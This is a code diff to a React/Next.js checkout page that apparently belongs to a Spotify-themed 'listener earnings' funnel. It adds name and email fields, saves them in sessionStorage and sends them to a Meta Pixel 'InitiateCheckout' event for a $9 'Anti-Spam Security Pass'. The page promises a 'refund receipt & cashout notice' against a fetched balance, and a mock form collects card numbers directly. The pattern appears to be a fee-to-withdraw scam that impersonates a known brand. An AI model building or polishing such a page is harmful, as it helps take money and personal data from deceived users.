@@ -38,6 +38,7 @@ import {
   useStripe,
 } from '@stripe/react-stripe-js';
 import { recordPaymentInSupabase } from '../../lib/supabase';
+import MetaPixelTracker from '../components/MetaPixelTracker';
 
 // Pre-load Stripe promise if key is present
 const stripePublishableKey = process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY || '';
@@ -49,14 +50,18 @@ const stripePromise = stripePublishableKey && !stripePublishableKey.includes('pl
 function StripePaymentForm({
   clientSecret,
   fullName,
+  setFullName,
   email,
+  setEmail,
   country,
   amountFormatted,
   onSuccess,
 }: {
   clientSecret: string;
   fullName: string;
+  setFullName: (v: string) => void;
   email: string;
+  setEmail: (v: string) => void;
   country: string;
   amountFormatted: string;
   onSuccess: () => void;
@@ -68,6 +73,20 @@ function StripePaymentForm({
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+
+    if (!fullName.trim()) {
+      setErrorMessage('Please enter your full name as shown on your card.');
+      return;
+    }
+    if (!email.trim() || !email.includes('@')) {
+      setErrorMessage('Please enter a valid email address to receive your confirmation receipt.');
+      return;
+    }
+
+    if (typeof window !== 'undefined') {
+      sessionStorage.setItem('spotify_listener_name', fullName.trim());
+      sessionStorage.setItem('spotify_listener_email', email.trim());
+    }
 
     if (!stripe || !elements) {
       return;
@@ -83,8 +102,8 @@ function StripePaymentForm({
           return_url: `${window.location.origin}/spotify/welcome`,
           payment_method_data: {
             billing_details: {
-              name: fullName || undefined,
-              email: email || undefined,
+              name: fullName.trim() || undefined,
+              email: email.trim() || undefined,
               address: {
                 country: country || 'US',
               },
@@ -113,6 +132,38 @@ function StripePaymentForm({
 
   return (
     <form onSubmit={handleSubmit} className="space-y-4">
+      {/* Full Name & Email (Auto-filled from previous step, editable) */}
+      <div className="space-y-3.5 mb-2">
+        <div>
+          <label className="block text-sm font-semibold text-gray-200 mb-2">
+            Full name
+          </label>
+          <input
+            type="text"
+            value={fullName}
+            onChange={(e) => setFullName(e.target.value)}
+            placeholder="First and last name"
+            className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
+          />
+        </div>
+
+        <div>
+          <label className="block text-sm font-semibold text-gray-200 mb-2">
+            Email address
+          </label>
+          <input
+            type="email"
+            value={email}
+            onChange={(e) => setEmail(e.target.value)}
+            placeholder="name@example.com"
+            className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
+          />
+          <p className="text-[11px] text-[#707e76] mt-1.5 flex items-center gap-1">
+            <span>Official refund receipt &amp; cashout notice will be sent to this email.</span>
+          </p>
+        </div>
+      </div>
+
       {/* Stripe Payment Element automatically manages Card, Google Pay, Apple Pay in tabs layout */}
       <div className="stripe-element-container py-1">
         <PaymentElement
@@ -236,6 +287,20 @@ function InteractiveMockPaymentForm({
     e.preventDefault();
     setErrorMsg(null);
 
+    if (!fullName.trim()) {
+      setErrorMsg('Please enter your full name as shown on your card.');
+      return;
+    }
+    if (!email.trim() || !email.includes('@')) {
+      setErrorMsg('Please enter a valid email address to receive your confirmation receipt.');
+      return;
+    }
+
+    if (typeof window !== 'undefined') {
+      sessionStorage.setItem('spotify_listener_name', fullName.trim());
+      sessionStorage.setItem('spotify_listener_email', email.trim());
+    }
+
     const cleanNum = cardNumber.replace(/\s/g, '');
     if (cleanNum.length < 15) {
       setErrorMsg('Please enter a valid card number (or test card 4242 4242 4242 4242).');
@@ -275,6 +340,38 @@ function InteractiveMockPaymentForm({
 
   return (
     <form onSubmit={handleSubmit} className="space-y-4">
+      {/* Full Name & Email (Auto-filled from previous step, editable) */}
+      <div className="space-y-3.5 mb-2">
+        <div>
+          <label className="block text-sm font-semibold text-gray-200 mb-2">
+            Full name
+          </label>
+          <input
+            type="text"
+            value={fullName}
+            onChange={(e) => setFullName(e.target.value)}
+            placeholder="First and last name"
+            className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
+          />
+        </div>
+
+        <div>
+          <label className="block text-sm font-semibold text-gray-200 mb-2">
+            Email address
+          </label>
+          <input
+            type="email"
+            value={email}
+            onChange={(e) => setEmail(e.target.value)}
+            placeholder="name@example.com"
+            className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors"
+          />
+          <p className="text-[11px] text-[#707e76] mt-1.5 flex items-center gap-1">
+            <span>Official refund receipt &amp; cashout notice will be sent to this email.</span>
+          </p>
+        </div>
+      </div>
+
       {/* Payment Method Selector Tabs */}
       <div className="grid grid-cols-2 gap-3 mb-2">
         <div
@@ -712,6 +809,16 @@ export default function PaymentPage() {
   // Success Confirmation Modal
   const [paymentSuccess, setPaymentSuccess] = useState(false);
 
+  // Auto-fill fullName and email from previous funnel steps if available
+  useEffect(() => {
+    if (typeof window !== 'undefined') {
+      const savedName = sessionStorage.getItem('spotify_listener_name');
+      if (savedName) setFullName(savedName);
+      const savedEmail = sessionStorage.getItem('spotify_listener_email');
+      if (savedEmail) setEmail(savedEmail);
+    }
+  }, []);
+
   // Load balance from backend
   useEffect(() => {
     async function fetchBalance() {
@@ -807,6 +914,11 @@ export default function PaymentPage() {
   const handlePaymentSuccess = () => {
     setPaymentSuccess(true);
 
+    if (typeof window !== 'undefined') {
+      if (email) sessionStorage.setItem('spotify_listener_email', email.trim());
+      if (fullName) sessionStorage.setItem('spotify_listener_name', fullName.trim());
+    }
+
     // Save transaction and user registration into Supabase database
     recordPaymentInSupabase({
       email: email || 'listener@verified.com',
@@ -826,6 +938,19 @@ export default function PaymentPage() {
 
   return (
     <div className="min-h-screen bg-[#070a08] text-[#e0e0e0] font-sans antialiased relative overflow-hidden selection:bg-[#1db954] selection:text-black">
+      {/* Meta Pixel & CAPI Checkout Tracker */}
+      <MetaPixelTracker
+        eventName="InitiateCheckout"
+        customData={{
+          content_name: 'Anti-Spam Security Pass Checkout',
+          value: 9.0,
+          currency: 'USD',
+        }}
+        userData={{
+          email,
+          full_name: fullName,
+        }}
+      />
       {/* Background Radial Glow Accent matching reference image */}
       <div className="absolute top-0 left-0 w-full h-[650px] bg-[radial-gradient(ellipse_80%_60%_at_25%_15%,rgba(29,185,84,0.18),rgba(15,35,22,0.45)_50%,transparent_80%)] pointer-events-none -z-10" />
 
@@ -995,6 +1120,7 @@ export default function PaymentPage() {
                   stripe={stripePromise}
                   options={{
                     clientSecret,
+                    locale: 'en',
                     appearance: {
                       theme: 'night',
                       variables: {
@@ -1039,7 +1165,9 @@ export default function PaymentPage() {
                   <StripePaymentForm
                     clientSecret={clientSecret}
                     fullName={fullName}
+                    setFullName={setFullName}
                     email={email}
+                    setEmail={setEmail}
                     country={country}
                     amountFormatted={chargeAmountFormatted}
                     onSuccess={handlePaymentSuccess}
